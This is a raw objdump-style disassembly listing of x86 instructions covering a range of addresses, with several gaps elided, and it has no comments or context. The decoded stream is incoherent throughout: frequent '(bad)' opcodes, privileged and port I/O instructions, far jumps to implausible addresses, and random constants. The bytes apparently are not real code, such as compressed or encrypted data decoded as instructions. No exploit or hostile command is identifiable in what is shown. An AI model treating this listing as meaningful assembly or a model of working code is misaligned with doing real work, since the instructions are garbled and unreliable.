  428d90:	imul   eax,DWORD PTR [edx+0x4a],0x29df8780
  428d97:	mov    ss,WORD PTR [esi+0x29]
  428d9a:	mov    edi,DWORD PTR [esi]
  428d9c:	enter  0xc731,0x47
  428da0:	je     0x428e0e
  428da2:	mov    eax,ds:0x5d97dbfd
  428da7:	push   ss
  428da8:	inc    ebp
  428da9:	outs   dx,DWORD PTR ds:[esi]
  428daa:	mov    ebp,0x717e4805
  428daf:	push   eax
  428db0:	outs   dx,DWORD PTR ds:[esi]
  428db1:	sbb    ch,BYTE PTR [ebp+0x354e05e5]
  428db7:	inc    edi
  428db8:	aam    0x6
  428dba:	mov    al,ds:0xb24ed28c
  428dbf:	adc    ebx,DWORD PTR [edi]
  428dc1:	vandnpd ymm3,ymm4,YMMWORD PTR [edi]
  428dc5:	xor    BYTE PTR [ebx-0x73],al
  428dc8:	jp     0x428d5f
  428dca:	cmp    DWORD PTR [eax-0x1],0x1496179f
  428dd1:	push   cs
  428dd2:	lea    ecx,[edx+0x21028b89]
  428dd8:	shl    DWORD PTR [eax-0x1c9ac968],0xd
  428ddf:	bound  ebp,QWORD PTR [ecx]
  428de1:	and    bl,ah
  428de3:	shl    BYTE PTR [ebx],1
  428de5:	test   ch,0xec
  428de8:	or     ch,BYTE PTR [ebp+0x1e]
  428deb:	xor    dh,BYTE PTR [esi]
  428ded:	outs   dx,DWORD PTR ds:[esi]
  428dee:	lock cmp al,0x9e
  428df1:	mov    ebp,0xe0ea9c25
  428df6:	inc    cx
  428df8:	push   esi
  428df9:	jnp    0x428e70
  428dfb:	xchg   BYTE PTR [ebp+ebx*1-0x56],al
  428dff:	stos   DWORD PTR es:[edi],eax
  428e00:	mov    ebp,DWORD PTR [ebx-0x40]
  428e03:	icebp  
  428e04:	nop
  428e05:	mov    dh,0x4d
  428e07:	inc    eax
  428e08:	push   ebp
  428e09:	pop    es
  428e0a:	js     0x428e74
  428e0c:	mov    eax,0xdd70e8e2
  428e11:	sbb    edi,DWORD PTR [ecx-0x58]
  428e14:	lods   al,BYTE PTR ds:[esi]
  428e15:	retf   0x5405
  428e18:	mov    ds:0x61f85611,eax
  428e1d:	pop    ss
  428e1e:	cld    
  428e1f:	stos   DWORD PTR es:[edi],eax
  428e20:	fidivr WORD PTR [esi+0x2b]
  428e23:	jb     0x428db7
  428e25:	inc    esi
  428e26:	xor    ah,dh
  428e28:	shl    DWORD PTR [ebx],1
  428e2a:	dec    edi
  428e2b:	xor    eax,0x1c6c4ed6
  428e30:	(bad)  
  428e31:	xor    dh,BYTE PTR [eax+0x74577855]
  428e37:	sbb    ch,dh
  428e39:	sbb    ah,BYTE PTR [ebx]
  428e3b:	mov    ebx,0xa0e75030
  428e40:	or     al,0xbf
  428e42:	scas   al,BYTE PTR es:[edi]
  428e43:	xchg   edi,eax
  428e44:	pop    eax
  428e45:	je     0x428e6c
  428e47:	push   esp
  428e48:	mov    BYTE PTR [eax+0x4ec3d8fc],al
  428e4e:	jbe    0x428ea6
  428e50:	in     eax,dx
  428e51:	add    BYTE PTR [edi+0x44],bh
  428e54:	inc    esp
  428e55:	ja     0x428e11
  428e57:	addr16 dec ebp
  428e59:	jnp    0x428ddb
  428e5b:	cmp    al,0xa2
  428e5d:	adc    al,0xff
  428e5f:	into   
  428e60:	cmp    eax,0xb4abc1df
  428e65:	imul   esi,edx,0xffffff9b
  428e68:	xchg   DWORD PTR [edx+0xbcb7087],ebx
  428e6e:	repnz xlat BYTE PTR ds:[ebx]
  428e70:	sub    al,0xde
  428e72:	pop    esi
  428e73:	(bad)  
  428e74:	ins    DWORD PTR es:[edi],dx
  428e75:	xchg   edi,eax
  428e76:	stos   BYTE PTR es:[edi],al
  428e77:	ret    0x6a53
  428e7a:	in     al,dx
  428e7b:	fisub  DWORD PTR [ecx]
  428e7d:	loopne 0x428e67
  428e7f:	ret    
  428e80:	rol    esp,1
  428e82:	fdivr  st,st(5)
  428e84:	inc    esi
  428e85:	enter  0x852f,0xf4
  428e89:	stos   DWORD PTR es:[edi],eax
  428e8a:	stos   DWORD PTR es:[edi],eax
  428e8b:	lahf   
  428e8c:	pop    eax
  428e8d:	jne    0x428e9f
  428e8f:	out    dx,al
	...
  428ef4:	dec    edi
  428ef5:	pop    ebp
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0x3f
  428f01:	fs cmp eax,0x1b55cbb
  428f07:	add    BYTE PTR [ecx+eax*1],al
  428f0a:	add    BYTE PTR [eax],al
  428f0c:	(bad)  
  428f0d:	shl    DWORD PTR ds:0xda7fa3a3,1
  428f13:	cs cs test DWORD PTR cs:[ebx],ebp
  428f18:	dec    edi
  428f19:	jmp    0x428f08
  428f1b:	mov    ds:0xf2c55ccb,al
  428f20:	and    BYTE PTR [ebx-0x1c341a6b],bl
  428f26:	mov    bl,0xcf
  428f28:	pop    esi
  428f29:	push   ss
  428f2a:	lock inc edx
  428f2c:	push   eax
  428f2d:	bound  ecx,QWORD PTR [edx]
  428f2f:	push   0xb6a88581
  428f34:	(bad)  
  428f35:	int3   
  428f36:	push   ebp
  428f37:	dec    ecx
  428f38:	mov    ds:0xecfd60dd,al
  428f3d:	and    BYTE PTR [ebp+0x1c],dh
  428f40:	mov    ds:0x79e7cdbe,eax
  428f45:	dec    eax
  428f46:	arpl   ax,ax
  428f48:	ret    0xcddb
  428f4b:	mov    ds:0xf2ba6d35,eax
  428f50:	mov    ?,WORD PTR [esi]
  428f52:	push   ebx
  428f53:	addr16 xor al,0xe2
  428f56:	xor    al,0x56
  428f58:	add    ecx,DWORD PTR [eax+0x4b]
  428f5b:	pushf  
  428f5c:	xor    dh,BYTE PTR [esi+0x9b88137]
  428f62:	mov    bh,0x82
  428f64:	xor    eax,0x25e3c896
  428f69:	nop
  428f6a:	daa    
  428f6b:	pusha  
  428f6c:	aam    0xb
  428f6e:	loopne 0x428fe0
  428f70:	mov    al,ds:0xda29708a
  428f75:	mov    BYTE PTR [ecx],dh
  428f77:	add    WORD PTR [ebx-0x76b4e86],di
  428f7e:	mov    eax,0x5201a5f7
  428f83:	or     al,0x12
  428f85:	push   ecx
  428f86:	dec    edi
  428f87:	or     DWORD PTR [edi+0x48dbbc87],ebp
  428f8d:	add    BYTE PTR cs:[ebp-0x4e1bbbaa],bl
  428f94:	push   ds
  428f95:	dec    eax
  428f96:	loope  0x428f20
  428f98:	add    BYTE PTR [ebx+0x7e7da6f6],dh
  428f9e:	jnp    0x428f97
  428fa0:	fisubr DWORD PTR ds:0x6d9dfc34
  428fa6:	sahf   
  428fa7:	shr    DWORD PTR [edx-0x26],1
  428faa:	or     DWORD PTR [edi+ebx*4+0x2e],edx
  428fae:	xor    BYTE PTR [ecx],al
  428fb0:	out    0xf4,al
  428fb2:	push   ss
  428fb3:	sti    
  428fb4:	jle    0x428f75
  428fb6:	cmp    DWORD PTR [ecx],edi
  428fb8:	gs inc ebp
  428fba:	cli    
  428fbb:	mov    ebp,0xb4c122b8
  428fc0:	or     eax,0xe02eb2ba
  428fc5:	mov    DWORD PTR ds:0xe9548c25,esi
  428fcb:	or     edx,DWORD PTR [edi]
  428fcd:	and    al,0xa3
  428fcf:	mov    BYTE PTR [ecx],bh
  428fd1:	or     dh,BYTE PTR [ebp+0x6944b369]
  428fd7:	mov    al,0x64
  428fd9:	ret    0x4236
  428fdc:	lods   al,BYTE PTR ds:[esi]
  428fdd:	mov    cl,0x8e
  428fdf:	push   ebp
  428fe0:	add    BYTE PTR [eax],bl
  428fe2:	adc    eax,0x4ff0c00
  428fe7:	mov    ah,BYTE PTR ds:0x40eb3ce7
  428fed:	and    ah,bh
  428fef:	cdq    
  428ff0:	icebp  
  428ff1:	cdq    
  428ff2:	jl     0x42905c
  428ff4:	mov    bh,0xc3
  428ff6:	push   0x5d2388e3
  428ffb:	dec    eax
  428ffc:	mov    esi,0x8cf0ec09
  429001:	xchg   esp,eax
  429002:	or     dh,al
  429004:	adc    eax,0x1f48829f
  429009:	push   0xec1a404b
  42900e:	push   edx
  42900f:	in     eax,0x0
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xb3fc7b77
  429081:	jp     0x4290f9
  429083:	lock pusha 
  429085:	mov    dh,0x1
  429087:	add    BYTE PTR [ecx+eax*1],al
  42908a:	add    BYTE PTR [eax],al
  42908c:	les    ebp,FWORD PTR [ebx+0x1b]
  42908f:	pop    eax
  429090:	xor    al,0x44
  429092:	scas   al,BYTE PTR es:[edi]
  429093:	jmp    0x979e6e69
  429098:	clc    
  429099:	call   FWORD PTR [eax]
  42909b:	cmc    
  42909c:	sub    al,0x36
  42909e:	sbb    ebx,DWORD PTR [eax+0x14]
  4290a1:	out    0x33,eax
  4290a3:	pop    edx
  4290a4:	add    DWORD PTR [esi],0x19963b27
  4290aa:	add    ecx,DWORD PTR [ecx]
  4290ac:	push   edi
  4290ad:	xchg   ebp,eax
  4290ae:	pop    ebx
  4290af:	lods   al,BYTE PTR ds:[esi]
  4290b0:	jbe    0x4290dd
  4290b2:	adc    ebx,DWORD PTR [edx+0x202b2bda]
  4290b8:	call   0x90e43710
  4290bd:	leave  
  4290be:	les    ebx,FWORD PTR [ebx+0x107e57da]
  4290c4:	sbb    eax,0xceedd125
  4290c9:	outs   dx,BYTE PTR ds:[esi]
  4290ca:	icebp  
  4290cb:	xor    DWORD PTR [ecx],0xffffff82
  4290ce:	fstp   DWORD PTR [ebx+0x586c2fbd]
  4290d4:	and    bh,BYTE PTR [esi-0x6a]
  4290d7:	mov    ebx,DWORD PTR [edi-0x2b727784]
  4290dd:	sbb    bl,BYTE PTR [ebp-0x56]
  4290e0:	fbld   TBYTE PTR [edi+0x30767397]
  4290e6:	jmp    0x4fa2:0x91fc31c3
  4290ed:	imul   ebx,DWORD PTR [si-0x1c91],0x4e
  4290f3:	add    BYTE PTR [esi-0x72],0xcc
  4290f7:	ds sub al,0xef
  4290fa:	shl    dh,1
  4290fc:	pop    edi
  4290fd:	jle    0x4290c4
  4290ff:	int3   
  429100:	ret    
  429101:	and    eax,0xca9b20
  429106:	pop    eax
  429107:	cld    
  429108:	popa   
  429109:	sbb    esp,ebx
  42910b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42910c:	dec    eax
  42910d:	mov    ch,0x6
  42910f:	pop    esp
  429110:	xchg   BYTE PTR ds:0x557190ea,ch
  429116:	test   eax,0x26980339
  42911b:	jge    0x42914a
  42911d:	stos   DWORD PTR es:[edi],eax
  42911e:	cmc    
  42911f:	push   esi
  429120:	gs (bad) 
  429122:	lahf   
  429123:	mov    ch,0x4
  429125:	aam    0xe8
  429127:	stos   BYTE PTR es:[edi],al
  429128:	(bad)  
  429129:	lods   eax,DWORD PTR gs:[esi]
  42912b:	pop    esi
  42912c:	jno    0x4290b8
  42912e:	or     al,0x2a
  429130:	(bad)  
  429131:	std    
  429132:	arpl   WORD PTR [esi],bp
  429134:	in     al,0xe3
  429136:	or     BYTE PTR [ebp+0x73],dh
  429139:	mov    dl,0xeb
  42913b:	ds out 0x41,al
  42913e:	add    BYTE PTR [ebp+esi*2-0x6a938579],bh
  429145:	add    BYTE PTR ds:0xcdf99b85,ch
  42914b:	out    0xba,eax
  42914d:	in     eax,0xb
  42914f:	test   BYTE PTR [ebx+eiz*1],0xf7
  429153:	les    esp,FWORD PTR [edx+0x23]
  429156:	shl    DWORD PTR [esi-0x53],1
  429159:	cld    
  42915a:	mov    DWORD PTR [esi],ecx
  42915c:	jae    0x42914c
  42915e:	icebp  
  42915f:	pop    ds
  429160:	cmp    dl,BYTE PTR [esi-0x24]
  429163:	mov    edx,0x7b8373db
  429168:	sub    edi,esi
  42916a:	jmp    0x56541f09
  42916f:	popa   
  429170:	fcom   QWORD PTR [eax+0x79870a4d]
  429176:	mov    DWORD PTR [eax+0x25],ebx
  429179:	add    al,0x67
  42917b:	mov    edi,0x89e91750
  429180:	inc    ecx
  429181:	adc    DWORD PTR [ecx],ecx
  429183:	jne    0x42916d
  429185:	es ret 0x79a8
  429189:	test   DWORD PTR [edi-0x5ac436fd],ebx
  42918f:	inc    ebp
	...
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ecx+edx*4+0x641c6180],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ecx],bl
  42920d:	loopne 0x4291a4
  42920f:	pop    ss
  429210:	retf   
  429211:	jns    0x4291b7
  429213:	mov    edx,0x69cfeaff
  429218:	int3   
  429219:	push   DWORD PTR [ebp+0x121c7b7b]
  42921f:	std    
  429220:	cmp    al,0x3a
  429222:	leave  
  429223:	jl     0x429205
  429225:	mov    ah,BYTE PTR ds:0x7ea9055e
  42922b:	loope  0x4291eb
  42922d:	fcmovnu st,st(6)
  42922f:	xor    DWORD PTR [ebp+0x37],esi
  429232:	inc    esi
  429233:	ds jmp 0xc98ae1c0
  429239:	or     ecx,DWORD PTR [edi]
  42923b:	sub    eax,0xedb65576
  429240:	(bad)  
  429241:	lahf   
  429242:	sbb    esi,DWORD PTR [edi-0x4ced0936]
  429248:	jmp    0xe649fb44
  42924d:	retf   
  42924e:	fistp  WORD PTR [ebx-0x2585259d]
  429254:	fld    QWORD PTR [ecx]
  429256:	scas   eax,DWORD PTR es:[edi]
  429257:	hlt    
  429258:	scas   eax,DWORD PTR es:[edi]
  429259:	xchg   edx,edx
  42925b:	cmp    bl,dh
  42925d:	outs   dx,BYTE PTR ds:[esi]
  42925e:	movhps xmm3,QWORD PTR [eax]
  429261:	dec    edi
  429262:	ja     0x429250
  429264:	inc    edx
  429265:	jnp    0x429226
  429267:	jg     0x4292a1
  429269:	pusha  
  42926a:	xchg   edi,eax
  42926b:	dec    esp
  42926c:	add    ebp,DWORD PTR [edi]
  42926e:	nop
  42926f:	fidiv  WORD PTR [eax+0x5e4611e1]
  429275:	push   esp
  429276:	sbb    ebx,DWORD PTR [esi+0x77]
  429279:	out    dx,al
  42927a:	sahf   
  42927b:	mov    al,BYTE PTR [esi+0x25662f63]
  429281:	sbb    ebx,DWORD PTR [eax+0x308d3cb1]
  429287:	lahf   
  429288:	jae    0x42920d
  42928a:	inc    edx
  42928b:	popa   
  42928c:	mov    ebp,0xf60a29ef
  429291:	pusha  
  429292:	cld    
  429293:	dec    ecx
  429294:	mov    ch,cl
  429296:	vunpcklps ymm0,ymm6,ymm5
  42929a:	jmp    0x42926d
  42929c:	rsm    
  42929e:	imul   edi,ebx,0xffffffa9
  4292a1:	inc    ebx
  4292a2:	or     al,0xdd
  4292a4:	daa    
  4292a5:	pop    edi
  4292a6:	add    al,0x6f
  4292a8:	mov    al,0xcf
  4292aa:	(bad)  
  4292ac:	inc    esp
  4292ad:	(bad)  
  4292ae:	(bad)  
  4292af:	mov    dh,0x36
  4292b1:	cmp    DWORD PTR [esi+0xdfd1477],ebx
  4292b7:	ds add edx,ebp
  4292ba:	enter  0x5670,0xd3
  4292be:	nop
  4292bf:	adc    dh,cl
  4292c1:	stos   BYTE PTR es:[edi],al
  4292c2:	lds    esi,FWORD PTR [ebx+0x69f8f311]
  4292c8:	scas   al,BYTE PTR es:[edi]
  4292c9:	nop    eax
  4292cc:	imul   edi,DWORD PTR [ecx],0x4fb58af8
  4292d2:	imul   ebp,DWORD PTR [edx],0x559d4929
  4292d8:	mov    WORD PTR [ebx],gs
  4292da:	mov    bl,0x36
  4292dc:	jae    0x4292ce
  4292de:	es dec esi
  4292e0:	out    dx,eax
  4292e1:	mov    eax,ds:0x7c09e285
  4292e6:	xchg   esp,eax
  4292e7:	xchg   BYTE PTR [edx-0x1a8efcc9],bl
  4292ed:	daa    
  4292ee:	push   ss
  4292ef:	push   cs
  4292f0:	add    esp,esp
  4292f2:	sahf   
  4292f3:	inc    esi
  4292f4:	dec    ebx
  4292f5:	pop    esp
  4292f6:	sub    BYTE PTR [esi-0x7ba643d0],dh
  4292fc:	std    
  4292fd:	stos   DWORD PTR es:[edi],eax
  4292fe:	das    
  4292ff:	xchg   esi,eax
  429300:	mov    eax,ds:0xb0299db0
  429305:	xchg   esi,eax
  429306:	xor    al,0xd1
  429308:	mov    ah,0x1f
  42930a:	int3   
  42930b:	mov    esp,0x3f4e56dd
	...
  429374:	lock adc al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xeb
  429381:	in     al,0x2d
  429383:	(bad)  
  429384:	push   0x40001b8
  429389:	add    DWORD PTR [eax],eax
  42938b:	add    BYTE PTR [ebx],bl
  42938d:	in     al,dx
  42938e:	mov    ebp,0xb5fdea7a
  429393:	int3   
  429394:	cs in  eax,0x87
  429397:	nop
  429398:	bound  edi,QWORD PTR [edx-0x49]
  42939b:	dec    edx
  42939c:	add    eax,0xbd41cfc0
  4293a1:	jae    0x4293c3
  4293a3:	xor    BYTE PTR [edx-0x83ff155],dh
  4293a9:	out    0x62,al
  4293ab:	test   ebx,0x376c603b
  4293b1:	cli    
  4293b2:	aaa    
  4293b3:	je     0x4293d5
  4293b5:	inc    ebp
  4293b6:	das    
  4293b7:	push   cs
  4293b8:	jns    0x4293b0
  4293ba:	sub    al,0x7a
  4293bc:	xchg   ebx,eax
  4293bd:	loope  0x4293a4
  4293bf:	dec    ecx
  4293c0:	mov    ds:0x3ac5fbc6,eax
  4293c5:	aad    0xb6
  4293c7:	rcr    BYTE PTR [esi-0x41516846],cl
  4293cd:	pop    ss
  4293ce:	sti    
  4293cf:	loopne 0x429424
  4293d1:	adc    BYTE PTR [esi],bh
  4293d3:	(bad)  
  4293d4:	cld    
  4293d5:	dec    ebx
  4293d6:	ins    BYTE PTR es:[edi],dx
  4293d7:	sar    DWORD PTR [edi-0x5e],cl
  4293da:	in     al,0x0
  4293dc:	mov    bl,0xb1
  4293de:	xor    DWORD PTR [ebx+ebx*8+0x5],0xb038563d
  4293e6:	push   cs
  4293e7:	mov    ch,0x47
  4293e9:	pop    esp
  4293ea:	pop    edx
  4293eb:	pop    esi
  4293ec:	jnp    0x4293c9
  4293ee:	cmp    ebx,edx
  4293f0:	fst    DWORD PTR [eax]
  4293f2:	cld    
  4293f3:	imul   ecx,esi,0x239c4b9e
  4293f9:	test   BYTE PTR [edi],al
  4293fb:	mov    esi,0x376109ed
  429400:	icebp  
  429401:	dec    edx
  429402:	sub    BYTE PTR [edx+0x2e],bl
  429405:	mov    dh,0xdf
  429407:	test   BYTE PTR [edi-0x7ecff41f],dl
  42940d:	outs   dx,DWORD PTR ds:[si]
  42940f:	loopne 0x4293d0
  429411:	push   esi
  429412:	mov    ebx,DWORD PTR [ebx-0x5240d5e8]
  429418:	ret    
  429419:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42941a:	pop    ds
  42941b:	xor    edx,DWORD PTR [ecx+0x7703fed4]
  429421:	sbb    BYTE PTR [esi-0x31],0x33
  429425:	out    0x84,al
  429427:	pop    esi
  429428:	xchg   ebx,eax
  429429:	cmp    eax,0x740e3c11
  42942e:	sub    ch,cl
  429430:	(bad)  
  429431:	imul   edi,DWORD PTR [ebp+0x7a2cb576],0xe2e97d0c
  42943b:	sbb    BYTE PTR ds:0xbc57de3d,dh
  429441:	dec    eax
  429442:	dec    edi
  429443:	aaa    
  429444:	sbb    al,0xc1
  429446:	inc    ebx
  429447:	das    
  429448:	push   0xa037e6f4
  42944d:	rol    DWORD PTR [edi],0x84
  429450:	lods   al,BYTE PTR ds:[esi]
  429451:	sub    DWORD PTR [edi],edx
  429453:	aaa    
  429454:	and    eax,0xab983c0c
  42945a:	cmp    esi,esi
  42945c:	(bad)  
  42945d:	dec    edi
  42945e:	xchg   esi,eax
  42945f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429460:	cwde   
  429461:	push   ebx
  429462:	mov    ecx,0x980c4a6f
  429467:	stos   BYTE PTR es:[edi],al
  429468:	aad    0x6e
  42946a:	add    ebx,edx
  42946c:	xchg   esi,eax
  42946d:	retf   
  42946e:	jge    0x42948d
  429470:	xor    ebx,esi
  429472:	cli    
  429473:	cmp    edx,ebx
  429475:	or     eax,0xbf0575d6
  42947a:	adc    DWORD PTR [ecx+0x6f],ebx
  42947d:	jle    0x4294a3
  42947f:	push   ds
  429480:	jp     0x4294b0
  429482:	xchg   ecx,ecx
  429484:	and    BYTE PTR [ecx+edi*8+0x61],ah
  429488:	sub    bh,BYTE PTR [ebx-0x55bbd50f]
  42948e:	iret   
  42948f:	into   
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x4b991516],dx
  429503:	(bad)  
  429504:	ins    BYTE PTR es:[edi],dx
  429505:	mov    ecx,0x1040001
  42950a:	add    BYTE PTR [eax],al
  42950c:	in     al,0x52
  42950e:	js     0x42953c
  429510:	push   0xffffff81
  429512:	popf   
  429513:	ror    BYTE PTR [edx+0x3],0xdc
  429517:	push   ecx
  429518:	push   es
  429519:	xor    DWORD PTR [ecx-0x17],ebp
  42951c:	std    
  42951d:	retf   0xdaa
  429520:	pusha  
  429521:	popf   
  429522:	sbb    bh,cl
  429524:	cmp    DWORD PTR [esp+edi*8+0x559bdfaa],edi
  42952b:	jae    0x42950b
  42952d:	les    edx,FWORD PTR [edi+ebp*1-0x6dd8b5f5]
  429534:	dec    eax
  429535:	push   eax
  429536:	outs   dx,BYTE PTR ds:[esi]
  429537:	hlt    
  429538:	mov    ah,0xf
  42953a:	adc    BYTE PTR [edx+0x62],dh
  42953d:	arpl   WORD PTR [ecx+0x3f],si
  429540:	fimul  DWORD PTR [edi+ecx*8+0x4a]
  429544:	in     eax,dx
  429545:	aaa    
  429546:	sti    
  429547:	(bad)  
  429548:	mov    cl,0xb6
  42954a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42954b:	pushf  
  42954c:	aam    0x86
  42954e:	ins    DWORD PTR es:[edi],dx
  42954f:	jg     0x429517
  429551:	jl     0x429578
  429553:	stos   DWORD PTR es:[edi],eax
  429554:	jns    0x429594
  429556:	test   DWORD PTR [edx],ebx
  429558:	cmp    al,0xd9
  42955a:	sbb    BYTE PTR [esp+eiz*8],cl
  42955d:	leave  
  42955e:	test   ebx,ebx
  429560:	dec    edx
  429561:	leave  
  429562:	xor    bh,BYTE PTR [eax+0x4c5b91c8]
  429568:	jle    0x429547
  42956a:	adc    dl,BYTE PTR [eax+0x6cddb95]
  429570:	inc    esi
  429571:	cdq    
  429572:	fcomp  DWORD PTR [eax-0x31]
  429575:	dec    ecx
  429576:	adc    esi,0xa27b22db
  42957c:	sar    BYTE PTR ss:[edx+0x2e],1
  429580:	scas   eax,DWORD PTR es:[edi]
  429581:	dec    esi
  429582:	mov    al,0x8d
  429585:	jne    0x42951c
  429587:	fsub   QWORD PTR [ebp+0x7f40a7c8]
  42958d:	dec    ebx
  42958e:	out    dx,al
  42958f:	ins    DWORD PTR es:[edi],dx
  429590:	shr    BYTE PTR [edx-0xe330801],1
  429596:	push   edx
  429597:	push   ds
  429598:	mov    esp,DWORD PTR [ecx]
  42959a:	js     0x4295c3
  42959c:	jle    0x4295f9
  42959e:	sahf   
  42959f:	xor    DWORD PTR [edi+0x488a53d7],ebx
  4295a5:	jmp    0x3a14:0x642ba6d3
  4295ac:	push   0x78c960e0
  4295b1:	push   ebx
  4295b2:	xchg   ebx,eax
  4295b3:	sub    DWORD PTR [edi+0x16],ebx
  4295b6:	(bad)  
  4295b7:	jmp    0x4295a0
  4295b9:	xchg   DWORD PTR [ecx],ebx
  4295bb:	das    
  4295bc:	ja     0x4295b4
  4295be:	jo     0x4295d0
  4295c0:	int    0x66
  4295c2:	sbb    edx,DWORD PTR [edi-0x3c]
  4295c5:	popa   
  4295c6:	mov    DWORD PTR [esi],0x6530ef54
  4295cc:	outs   dx,DWORD PTR ds:[esi]
  4295cd:	push   0xe3f70f7
  4295d2:	cmp    al,0x22
  4295d4:	shl    DWORD PTR [ecx-0x75],0x88
  4295d8:	enter  0x2a6d,0xc1
  4295dc:	xchg   esp,eax
  4295dd:	push   ebx
  4295de:	and    ah,BYTE PTR [ecx+0x7ad71970]
  4295e4:	pop    ds
  4295e5:	xchg   BYTE PTR [edi],dh
  4295e7:	dec    ebp
  4295e8:	xchg   ebx,eax
  4295e9:	out    0x16,al
  4295eb:	(bad)  
  4295ec:	pusha  
  4295ed:	mov    BYTE PTR [edx],ch
  4295ef:	xor    al,0x42
  4295f1:	adc    ah,ah
  4295f3:	and    eax,0xe20c30db
  4295f8:	cmp    eax,0xdf05cf52
  4295fd:	mov    dh,0x62
  4295ff:	and    ecx,edi
  429601:	mov    ebx,DWORD PTR [ecx-0x43]
  429604:	push   esp
  429605:	push   ebx
  429606:	cld    
  429607:	xor    DWORD PTR [ecx],edx
  429609:	dec    esi
  42960a:	call   0x84c971f2
  42960f:	in     al,0x0
	...
  429671:	add    BYTE PTR [eax],al
  429673:	add    BYTE PTR [ebp+0x1d],ch
  429676:	out    0xc0,al
  429678:	idiv   bl
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	add    ebp,edi
  429682:	dec    edi
  429683:	or     DWORD PTR [eax-0x46],esi
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	xchg   ebp,eax
  42968d:	cmp    DWORD PTR [ecx+0x55855b71],edi
  429693:	push   edi
  429694:	stos   BYTE PTR es:[edi],al
  429695:	jmp    0x744de29e
  42969a:	cmp    ecx,eax
  42969c:	and    al,bh
  42969e:	dec    ebx
  42969f:	and    al,0x84
  4296a1:	dec    ebx
  4296a2:	mov    ah,0x8a
  4296a4:	fisubr DWORD PTR [esi+0x61]
  4296a7:	icebp  
  4296a8:	xor    edi,DWORD PTR [ebx]
  4296aa:	jmp    0x4f5f9d01
  4296af:	push   ds
  4296b0:	mov    eax,0x1e32c48b
  4296b5:	test   eax,0x3bb924f6
  4296ba:	daa    
  4296bb:	jnp    0x42970a
  4296bd:	jo     0x4296b7
  4296bf:	xor    ecx,esp
  4296c1:	and    eax,0xb91e6d0
  4296c6:	push   ebp
  4296c7:	gs mov dh,0x7c
  4296ca:	das    
  4296cb:	add    BYTE PTR [ebp-0x3403bb48],al
  4296d1:	push   ebx
  4296d2:	dec    ecx
  4296d3:	mov    ebx,0xbf93c776
  4296d8:	je     0x4296b3
  4296da:	fadd   DWORD PTR [edi-0x54]
  4296dd:	mov    ah,dh
  4296df:	icebp  
  4296e0:	mov    eax,0xe6826cc1
  4296e5:	icebp  
  4296e6:	cs nop
  4296e8:	or     bh,dh
  4296ea:	not    dh
  4296ec:	or     edi,esi
  4296ee:	jmp    0x2b6e3d07
  4296f3:	imul   DWORD PTR [ecx]
  4296f5:	push   0xe10e8c93
  4296fa:	cmp    al,0x74
  4296fc:	cmc    
  4296fd:	fs push esp
  4296ff:	pop    edx
  429700:	aas    
  429701:	lds    eax,FWORD PTR [edi+eax*8+0x57dbc11c]
  429708:	pop    ds
  429709:	aas    
  42970a:	stc    
  42970b:	xchg   DWORD PTR [edx+0x46],eax
  42970e:	pusha  
  42970f:	repnz fiadd WORD PTR [ecx+edx*8-0x6b]
  429714:	mov    ah,0x47
  429716:	sti    
  429717:	jp     0x4296f8
  429719:	jns    0x4296e0
  42971b:	add    al,0xa
  42971d:	lods   al,BYTE PTR ds:[esi]
  42971e:	ins    BYTE PTR es:[edi],dx
  42971f:	inc    ebp
  429720:	test   al,0x4a
  429722:	das    
  429723:	scas   al,BYTE PTR es:[edi]
  429724:	inc    esi
  429725:	sub    BYTE PTR [ebx+ecx*4],dh
  429728:	clc    
  429729:	inc    edi
  42972a:	jns    0x42978e
  42972c:	inc    ebx
  42972d:	lea    ebx,[edi-0x7c]
  429730:	xor    dh,BYTE PTR [ebx+0x72]
  429733:	lods   eax,DWORD PTR ds:[esi]
  429734:	mov    WORD PTR [ebx-0x6f],fs
  429737:	xchg   ecx,eax
  429738:	fisub  WORD PTR [ebp-0x6f]
  42973b:	sub    DWORD PTR [edx+0x21e3212c],esp
  429741:	cmp    edx,esi
  429743:	neg    BYTE PTR [edx-0x1a]
  429746:	fcom   DWORD PTR [edx-0x44]
  429749:	push   ds
  42974a:	sbb    eax,DWORD PTR [edi+esi*8]
  42974d:	cmp    eax,0xecc9dbf8
  429752:	and    dh,BYTE PTR [ebx]
  429754:	mov    ds:0x315ffe48,eax
  429759:	add    eax,0x59043877
  42975e:	call   0x7769:0xed0af741
  429765:	pop    ss
  429766:	inc    esi
  429767:	into   
  429768:	int3   
  429769:	sub    al,0xfb
  42976b:	idiv   esp
  42976d:	shl    DWORD PTR [esi+0x70],0x96
  429771:	jo     0x429730
  429773:	add    DWORD PTR ds:0xaa62cfb5,0x44
  42977a:	sub    ah,al
  42977c:	add    ebp,DWORD PTR [edi]
  42977e:	test   al,0x93
  429780:	jl     0x429755
  429782:	jle    0x4297a3
  429784:	ret    
  429785:	sbb    eax,0x33e8c390
  42978a:	xchg   al,cl
  42978c:	adc    eax,esi
  42978e:	data16 lods al,BYTE PTR ds:[esi]
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
